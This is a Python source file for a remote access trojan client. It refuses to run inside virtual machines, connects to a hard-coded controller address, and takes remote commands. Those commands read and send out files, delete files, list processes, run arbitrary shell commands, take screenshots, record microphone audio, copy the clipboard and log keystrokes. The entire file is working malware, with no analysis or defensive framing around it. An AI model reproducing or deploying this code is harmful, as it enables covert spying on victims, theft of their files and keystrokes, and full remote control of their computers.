import socket
import os
import subprocess
import platform
from typing import KeysView
import psutil
import mss
from mss import mss as ms
import sounddevice as sd
from scipy.io.wavfile import write
import time
import clipboard
from pynput import keyboard


def checkVM(): 
    if platform.system() == "Windows": 
        if ('\n0' in subprocess.getoutput("wmic bios get serialnumber") or 
            'innotek GmbH' in subprocess.getoutput("wmic computersystem get model") or 
            'VirtualBox' in subprocess.getoutput("wmic computersystem get manufacturer")): 
            return True 
        else: 
            return False 
        
    elif platform.system() == 'Linux': 
        if (subprocess.getoutput('systemd-detect-virt') == 'none'): 
            return False 
        else: 
            return True

if not checkVM():

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_ip = '192.168.0.4'

    client.connect((server_ip, 11111))

    print('Connection: Success!')

else:
    print("No, we don't work with VMs (-_-)")
    exit()
    

def Send(data):
    size = len(data)
    print(size)
    client.send(str(size).encode())
    client.recv(6)

    snt = 0
    while snt < size:
        client.send(data[snt:snt+1024])
        snt = snt + 1024
        print(snt)
    
    client.recv(6)
    
    

print('Connection: receiving commands..')
while True:
    command = client.recv(1024).decode()
    print(command)
    if command == 'lrd':
        client.send('ok'.encode())
        res = str(os.listdir("/"))
        client.send(res.encode())

    elif command == 'gfc':
        client.send('ok'.encode())
        path = client.recv(1024).decode()
        try:
            with open(path, 'rb') as file:
                res = str(file.read())
        except Exception:
            res = "File not found or do not exist."
        Send(res.encode())
        
    elif command == 'ld':
        client.send('ok'.encode())
        path = client.recv(1024).decode()
        try:
            res = str(os.listdir(path))
        except Exception:
            res = "Directory not found or do not exist."
        client.send(res.encode())
    
    elif command == 'gsi':
        client.send('ok'.encode())
        res = f"{platform.platform()}-{platform.version()}-{platform.release()}-{platform.uname()}-{platform.processor()}-{socket.gethostname()}"
        client.send(res.encode())

    elif command == 'df':
        client.send('ok'.encode())
        path = client.recv(1024).decode()
        try:
            os.remove(path)
            res = "Deleted."
        except Exception:
            res = "File not found or do not exist."
        client.send(res.encode())

    elif command == 'lp':
        client.send('ok'.encode())
    
        proc = []
        for i in psutil.process_iter(['pid','name','username']):
            proc.append(f"{i.info['pid']}-{i.info['username']}-{i.info['name']}") 

        proc = str("+".join(proc))
        Send(proc.encode())

    elif command == 'exc':
        client.send('ok'.encode())
        com = client.recv(1024).decode()
        res = str(subprocess.getoutput(com))
        client.send(res.encode())

    elif command == 'cs':
        client.send('ok'.encode())
        scr = ms().grab(ms().monitors[1])
        res = mss.tools.to_png(scr.rgb,scr.size)
        Send(res)

    elif command == 'ca':
        client.send('ok'.encode())
        duration = 5
        frequency = 44100
        record = sd.rec(int(duration*frequency),samplerate = frequency, channels = 2)
        sd.wait()
        write("record.wav", frequency, record)
        time.sleep(2)
        with open("record.wav", 'rb') as file:
            res = file.read()

        Send(res)

    elif command == 'cc':
        client.send('ok'.encode())
        res = str(clipboard.paste())
        Send(res.encode())

    elif command == 'kl':
        client.send('ok'.encode())

        global Keys
        keys = ''
        def on_press(key):
            global keys
            try:
                keys += str(key.char) + '~~'
            except AttributeError:
                keys += str(key) + '~~'

        def on_release(key):
            global keys
            if key == keyboard.Key.esc:
                # Stop listener
                return False

        # Collect events until released
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        
        Send(keys.encode())
